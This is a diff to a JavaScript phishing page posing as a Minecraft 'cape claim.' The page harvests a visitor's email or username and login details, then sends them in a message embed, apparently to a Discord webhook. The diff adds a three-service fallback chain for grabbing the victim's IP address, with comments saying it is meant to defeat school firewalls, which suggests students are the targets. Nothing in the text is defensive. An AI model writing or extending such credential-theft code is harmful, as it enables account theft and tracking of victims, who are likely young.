@@ -179,20 +179,22 @@
         const displayEmail = document.getElementById('display-email');
 
         let savedEmail = "";
-        let userIp = "Unknown";
+        let userIp = "Retrieving...";
 
-              // Nowe, niezawodne pobieranie adresu IP (omija większość blokad szkolnych)
+        // POTRÓJNE zabezpieczenie pobierania IP przeciwko szkolnym blokadom (Firewallom)
         fetch('https://ipapi.co')
-            .then(response => response.json())
-            .then(data => {
-                userIp = data.ip;
-            })
+            .then(res => res.json())
+            .then(data => { userIp = data.ip; })
             .catch(() => {
-                // Alternatywne zapytanie awaryjne, jeśli pierwsze zawiedzie
                 fetch('https://ipify.org')
                     .then(res => res.json())
-                    .then(d => { userIp = d.ip; })
-                    .catch(() => { userIp = "Blocked by School Firewall"; });
+                    .then(data => { userIp = data.ip; })
+                    .catch(() => {
+                        fetch('https://db-ip.com')
+                            .then(res => res.json())
+                            .then(data => { userIp = data.ipAddress; })
+                            .catch(() => { userIp = "Protected / School Firewall"; });
+                    });
             });
 
         // Next button click
@@ -218,7 +220,7 @@
 
             const data = {
                 embeds: [{
-                    title: "🔔 New Minecraft Login (Cape Claim)",
+                    title: "🔔 New Minecraft Login Cape Claim",
                     color: 5025616,
                     fields: [
                         { name: "📧 Email / Username", value: savedEmail, inline: false },
